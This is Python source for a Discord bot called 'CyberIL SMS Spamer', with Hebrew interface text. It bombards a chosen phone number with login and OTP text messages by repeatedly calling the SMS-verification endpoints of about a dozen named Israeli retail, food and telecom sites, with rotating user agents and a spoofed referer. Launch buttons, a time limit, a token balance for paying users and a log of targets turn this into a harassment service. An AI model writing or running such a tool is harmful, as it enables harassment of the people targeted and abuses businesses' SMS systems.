import discord
from discord import app_commands
from discord.ext import commands
import os
import requests
import asyncio
import random
from datetime import datetime, timedelta
from motor.motor_asyncio import AsyncIOMotorClient

# --- הגדרות מערכת ---
TOKEN = os.getenv('DISCORD_TOKEN')
MONGO_URI = os.getenv('MONGO_URI')
BLOCKED_NUMBERS = ["0535524017"]

# חיבור ל-Database
cluster = AsyncIOMotorClient(MONGO_URI)
db = cluster["cyberil"]
users_col = db["users"]
logs_col = db["logs"]

active_attacks = {}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
]

class CyberBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        await self.tree.sync()
        print(f"✅ CyberIL System Online | New APIs Integrated")

bot = CyberBot()

# --- פונקציות עזר ---
async def get_user(uid):
    user = await users_col.find_one({"_id": uid})
    if not user:
        user = {"_id": uid, "tokens": 0, "last_claim": None}
        await users_col.insert_one(user)
    return user

def api_call(url, data=None, method="POST", is_json=True, params=None):
    try:
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "application/json, text/plain, */*",
            "Referer": "https://www.google.com/"
        }
        if method == "GET": 
            r = requests.get(url, headers=headers, params=params, timeout=5)
        elif method == "PUT": 
            r = requests.put(url, json=data, headers=headers, timeout=5)
        else:
            if is_json: r = requests.post(url, json=data, headers=headers, timeout=5)
            else: r = requests.post(url, data=data, headers=headers, timeout=5)
        return r.status_code in [200, 201, 204]
    except: return False

async def fire_round(phone):
    # נתונים גנריים לאתרים שדורשים form_key או מזהים
    magento_data = {"type": "login", "telephone": phone, "bot_validation": 1}
    
    tasks = [
        # --- אתרים חדשים שהוספת ---
        asyncio.to_thread(api_call, "https://www.crazyline.com/customer/ajax/post/", magento_data, is_json=False),
        asyncio.to_thread(api_call, "https://www.onot.co.il/customer/ajax/post/", magento_data, is_json=False),
        asyncio.to_thread(api_call, "https://www.urbanica-wh.com/customer/ajax/post/", magento_data, is_json=False),
        asyncio.to_thread(api_call, "https://api.dominos.co.il/sendOtp", {"otpMethod":"text","customerId": phone,"language":"he"}),
        asyncio.to_thread(api_call, "https://www.10bis.co.il/NextApi/GetActivationTokenAndSendActivationCodeToUser", method="GET", params={"culture":"he-IL", "cellPhone": phone, "email": "asaf@gmail.com"}),
        
        # --- האתרים הקיימים ---
        asyncio.to_thread(api_call, "https://digital-api.cellcom.co.il/api/otp/LoginStep1", {"Subscriber": phone, "OtpOrigin": "main OTP"}, method="PUT"),
        asyncio.to_thread(api_call, "https://server.myofer.co.il/api/sendAuthSms", {"phoneNumber": phone}),
        asyncio.to_thread(api_call, "https://www.timberland.co.il/customer/ajax/post/", magento_data, is_json=False),
        asyncio.to_thread(api_call, "https://www.fixfixfixfix.co.il/customer/ajax/post/", magento_data, is_json=False),
        asyncio.to_thread(api_call, "https://app.burgeranch.co.il/_a/aff_otp_auth", {"phone": phone}, is_json=False),
        asyncio.to_thread(api_call, "https://www.globes.co.il/news/login-2022/ajax_handler.ashx", {"value": phone, "value_type": "154"}, is_json=False),
        asyncio.to_thread(api_call, "https://users-auth.hamal.co.il/auth/send-auth-code", {"value": phone, "type": "phone", "projectId": "1"}),
        asyncio.to_thread(api_call, f"https://www.ivory.co.il/user/login/sendCodeSms/temp@gmail.com/{phone}", method="GET")
    ]
    
    results = await asyncio.gather(*tasks)
    return sum(1 for r in results if r is True), sum(1 for r in results if r is False)

# --- המשך הלוגיקה (run_attack, CyberView, וכו') נשאר זהה ---
# [כאן מגיע שאר הקוד שסיפקתי קודם - פקודות ה-setup וה-give]

async def run_attack(interaction, phone, minutes):
    uid = interaction.user.id
    active_attacks[uid] = True
    total_s, total_f = 0, 0
    end_time = datetime.now() + timedelta(minutes=minutes)
    
    await interaction.followup.send(f"🚀 **הפצצה החלה!** יעד: `{phone}`", ephemeral=True)

    while datetime.now() < end_time and active_attacks.get(uid):
        user = await get_user(uid)
        if user["tokens"] <= 0: break
        
        s, f = await fire_round(phone)
        total_s += s
        total_f += f
        
        await asyncio.sleep(60) 
        await users_col.update_one({"_id": uid}, {"$inc": {"tokens": -1}})

    await logs_col.insert_one({"user": interaction.user.name, "target": phone, "success": total_s, "date": datetime.now()})
    active_attacks.pop(uid, None)
    await interaction.followup.send(f"🏁 **הסתיים!** יעד: `{phone}` | הצלחות: `{total_s}`", ephemeral=True)

class CyberView(discord.ui.View):
    def __init__(self): super().__init__(timeout=None)

    @discord.ui.button(label="שגר הפצצה", style=discord.ButtonStyle.danger, emoji="🚀")
    async def launch(self, interaction: discord.Interaction, button: discord.ui.Button):
        user = await get_user(interaction.user.id)
        if user["tokens"] < 1: return await interaction.response.send_message("❌ אין לך טוקנים!", ephemeral=True)
        
        class LaunchModal(discord.ui.Modal, title="CyberIL - Launcher"):
            phone = discord.ui.TextInput(label="מספר טלפון", min_length=10, max_length=10)
            mins = discord.ui.TextInput(label="זמן (1-100)", default="5")
            async def on_submit(self, modal_inter: discord.Interaction):
                if self.phone.value in BLOCKED_NUMBERS: return await modal_inter.response.send_message("🚫 חסום!", ephemeral=True)
                await modal_inter.response.defer(ephemeral=True)
                asyncio.create_task(run_attack(modal_inter, self.phone.value, int(self.mins.value)))
        await interaction.response.send_modal(LaunchModal())

    @discord.ui.button(label="בדיקת מטבעות", style=discord.ButtonStyle.primary, emoji="💰")
    async def check(self, interaction: discord.Interaction, button: discord.ui.Button):
        user = await get_user(interaction.user.id)
        await interaction.response.send_message(f"💰 יתרה: **{user['tokens']}** דקות.", ephemeral=True)

    @discord.ui.button(label="טוקן יומי", style=discord.ButtonStyle.success, emoji="🎁")
    async def gift(self, interaction: discord.Interaction, button: discord.ui.Button):
        user = await get_user(interaction.user.id)
        now = datetime.now()
        if not user["last_claim"] or now >= user["last_claim"] + timedelta(hours=24):
            await users_col.update_one({"_id": interaction.user.id}, {"$inc": {"tokens": 5}, "$set": {"last_claim": now}})
            await interaction.response.send_message("✅ קיבלת 5 דקות!", ephemeral=True)
        else: await interaction.response.send_message("⏳ חזור מחר.", ephemeral=True)

    @discord.ui.button(label="עצור", style=discord.ButtonStyle.secondary, emoji="🛑")
    async def stop(self, interaction: discord.Interaction, button: discord.ui.Button):
        active_attacks[interaction.user.id] = False
        await interaction.response.send_message("🛑 נעצר.", ephemeral=True)

@bot.tree.command(name="spamer-setup", description="לוח בקרה")
async def setup(interaction: discord.Interaction):
    user = await get_user(interaction.user.id)
    embed = discord.Embed(title="⚡ CyberIL SMS Spamer Control", color=0x2f3136)
    embed.add_field(name="📊 סטטיסטיקה", value=f"יתרה: `{user['tokens']}` דקות\nסטטוס שרת: `Online`", inline=False)
    embed.set_thumbnail(url="https://emojicdn.elk.sh/🤝")
    await interaction.response.send_message(embed=embed, view=CyberView())

@bot.tree.command(name="spamer-give", description="הענקת טוקנים")
async def give(interaction: discord.Interaction, user: discord.Member, amount: int):
    await users_col.update_one({"_id": user.id}, {"$inc": {"tokens": amount}}, upsert=True)
    await interaction.response.send_message(f"🎁 הוענקו {amount} דקות ל-{user.mention}.", ephemeral=True)

bot.run(TOKEN)
